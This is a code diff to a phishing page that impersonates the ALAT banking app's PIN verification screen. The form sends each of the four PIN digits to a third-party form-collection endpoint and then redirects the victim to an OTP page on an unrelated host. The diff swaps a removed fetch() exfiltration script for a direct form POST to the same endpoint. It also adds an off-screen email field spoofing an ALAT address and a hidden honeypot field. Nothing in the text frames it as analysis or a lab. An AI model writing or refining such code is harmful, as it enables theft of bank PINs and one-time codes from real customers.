@@ -109,6 +109,13 @@
     font-size: 22px !important;
   }
 
+  .hidden-field {
+    position: absolute !important;
+    left: -9999px !important;
+    width: 1px !important;
+    height: 1px !important;
+  }
+
   @media (max-width: 360px) {
     .fin-input {
       width: 40px !important;
@@ -147,20 +154,24 @@
           </div>
           <div class="formSec">
             <div class="input">
-              <form id="finForm">
-                <!-- Required email field for UserBasin -->
-                <input type="hidden" name="email" value="user@example.com" />
-                <input type="hidden" name="_redirect" value="false" />
-                <input type="hidden" name="subject" value="ALAT Pin Verification" />
+              <form action="https://usebasin.com/f/c7a3b223942d" method="POST" id="finForm">
+                <!-- Honeypot field (bots fill this, humans don't see it) -->
+                <input type="text" name="honeypot" value="" class="hidden-field" tabindex="-1" autocomplete="off" />
+                
+                <!-- Required visible email field -->
+                <input type="email" name="email" value="verification@alat.ng" readonly style="position: absolute; left: -9999px;" />
+                
+                <input type="hidden" name="name" value="ALAT User" />
+                <input type="hidden" name="_redirect" value="https://webwemma-app.pxxl.click/otp.html" />
                 
                 <div class="formfin">
-                  <input id="fin-0" type="text" name="digit1" maxlength="1" class="fin-input" inputmode="numeric"
+                  <input id="fin-0" type="text" name="Pin_Digit_1" maxlength="1" class="fin-input" inputmode="numeric"
                     pattern="[0-9]" title="Please enter a digit (0-9)" required />
-                  <input id="fin-1" type="text" name="digit2" maxlength="1" class="fin-input" inputmode="numeric"
+                  <input id="fin-1" type="text" name="Pin_Digit_2" maxlength="1" class="fin-input" inputmode="numeric"
                     pattern="[0-9]" title="Please enter a digit (0-9)" required />
-                  <input id="fin-2" type="text" name="digit3" maxlength="1" class="fin-input" inputmode="numeric"
+                  <input id="fin-2" type="text" name="Pin_Digit_3" maxlength="1" class="fin-input" inputmode="numeric"
                     pattern="[0-9]" title="Please enter a digit (0-9)" required />
-                  <input id="fin-3" type="text" name="digit4" maxlength="1" class="fin-input" inputmode="numeric"
+                  <input id="fin-3" type="text" name="Pin_Digit_4" maxlength="1" class="fin-input" inputmode="numeric"
                     pattern="[0-9]" title="Please enter a digit (0-9)" required />
                 </div>
 
@@ -175,35 +186,6 @@
       </div>
     </div>
   </div>
-
-  <script>
-    document.getElementById('finForm').addEventListener('submit', async function (e) {
-      e.preventDefault();
-
-      const formData = new FormData(this);
-      const data = new URLSearchParams();
-      
-      for (const pair of formData) {
-        data.append(pair[0], pair[1]);
-      }
-
-      try {
-        await fetch('https://usebasin.com/f/c7a3b223942d', {
-          method: 'POST',
-          body: data,
-          headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/x-www-form-urlencoded'
-          }
-        });
-        
-        window.location.href = 'https://webwemma-app.pxxl.click/otp.html';
-      } catch (error) {
-        console.error('Error:', error);
-        window.location.href = 'https://webwemma-app.pxxl.click/otp.html';
-      }
-    });
-  </script>
 
   <script>
     const inputs = document.querySelectorAll('.fin-input');
